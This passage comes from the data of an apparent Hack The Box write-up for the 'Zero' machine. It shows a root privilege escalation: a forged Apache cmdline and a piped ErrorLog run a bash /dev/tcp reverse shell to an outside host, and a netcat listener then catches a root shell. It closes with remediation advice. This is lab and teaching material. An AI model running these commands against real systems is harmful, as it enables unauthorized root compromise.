        { kind: "p", text: "The difference from Method 1 is the trailing flag on the forged cmdline. Here we **do not** want test mode — Apache must actually *start* so the pipe program spawns. So the fake ends in `-D`. Apache declares `-D` in its getopt option string as `D:` — the trailing colon means it *requires* an argument — so getopt consumes the very next token verbatim, without checking whether it begins with a dash. The cron-appended `-t` is therefore eaten as the define name \"`-t`\" rather than parsed as the test-mode flag. Apache starts for real, and the `ErrorLog` pipe program launches as root." },
        { kind: "p", text: "Plant all three files on the target — the config, the reverse-shell script, and the `-D` variant of `fake.pl` — then launch:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — plant everything and launch",
          lines: [
            "zroadmin@zero:~$ cat > /dev/shm/.z1/conf/apache2.conf <<'EOF'",
            "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so",
            "ServerRoot \"/dev/shm/.z1\"",
            "Listen 9999",
            "ServerName localhost",
            "ErrorLog \"|/dev/shm/.z1/rev.sh\"",
            "EOF",
            "",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/rev.sh <<'EOF'",
            "#!/bin/bash",
            "bash -i >& /dev/tcp/10.10.14.41/443 0>&1",
            "EOF",
            "zroadmin@zero:~$ chmod +x /dev/shm/.z1/rev.sh      # MANDATORY — see the warning below",
            "",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/fake.pl <<'EOF'",
            "#!/usr/bin/perl",
            "$0 = \"/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/.z1/conf -D\";",
            "sleep(223);",
            "EOF",
            "",
            "zroadmin@zero:~$ nohup perl /dev/shm/.z1/fake.pl >/dev/null 2>&1 &",
          ],
        },
        { kind: "callout", variant: "warn", title: "The +x on rev.sh is not optional", text: "Apache launches an `ErrorLog \"|program\"` pipe by executing the program at its bare path, as root, at startup. If `rev.sh` isn't executable the `exec` fails and no connect-back ever fires — and because Method 3 runs Apache for real (not in `-t` mode), **the failure is completely silent**: no error, no shell. A missing `chmod +x` is the single most common reason this method \"does nothing.\"" },
        { kind: "p", text: "Start your listener *before* the next tick, then wait for root to connect back:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — catch root",
          lines: [
            "$ nc -lnvp 443",
            "listening on [any] 443 ...",
            "connect to [10.10.14.41] from (UNKNOWN) [10.129.234.62]",
            "root@zero:/# id",
            "uid=0(root) gid=0(root) groups=0(root)",
            "root@zero:/# cat /root/root.txt",
            "7d4f9a1c····························",
          ],
          highlight: [6],
        },
        { kind: "callout", variant: "warn", title: "Timing", text: "The piped program is launched the moment Apache starts, which is when the cron fires — at the top of the minute. Have your listener up *before* the tick, or you'll miss the connect-back and have to wait another 60 seconds." },
      ],
    },
    {
      id: "root",
      num: "15",
      title: "`root.txt`",
      blocks: [
        { kind: "p", text: "Any of the three delivers the goods — Method 1 quietly hands you the flag through a config-parse error, Method 2 drops a SUID root `bash`, and Method 3 calls back an interactive root shell. Owned." },
        { kind: "callout", variant: "key", title: "root.txt", text: "`7d4f9a1c····························`" },
        { kind: "p", text: "As with user.txt, HTB rotates this per spawn — the hash above is illustrative of one run, not your flag." },
      ],
    },
    {
      id: "remediation",
      num: "16",
      title: "Remediation & Takeaways",
      blocks: [
        { kind: "p", text: "Every step here was an intended feature bent past its purpose. The fixes are about trust boundaries:" },
        {
          kind: "ul",
          items: [
            "**Don't provision accounts from log files.** Emitting credentials into response headers and having a root cron turn `accounts.log` into `useradd` calls is a data-flow that trusts web output. Provision atomically in the application with proper validation.",
            "**Lock down `AllowOverride` / `mod_userdir`.** Allowing user-supplied `.htaccess` to set `ErrorDocument` expressions grants arbitrary file read. Disable `UserDir`, or set `AllowOverride None`, or forbid expression functions in untrusted contexts.",
            "**Never keep secrets in web-readable source.** Hard-coded DB creds in `stats.php` became SSH creds through reuse — rotate, scope, and separate credentials per service.",
            "**Never execute a string derived from another process's cmdline.** The confcheck cron's `$cmd` word-split as root is the root cause of the privesc. Validate inputs, quote everything, and don't let unprivileged users influence what root executes. A \"config checker\" should read a fixed, trusted config path — never one implied by a process it merely observed.",
          ],
        },
        { kind: "p", text: "Zero earns its rating not through obscurity but through *composition*: half a dozen reasonable-looking features that, lined up, walk an anonymous visitor all the way to root." },
      ],
    },
  ],
};
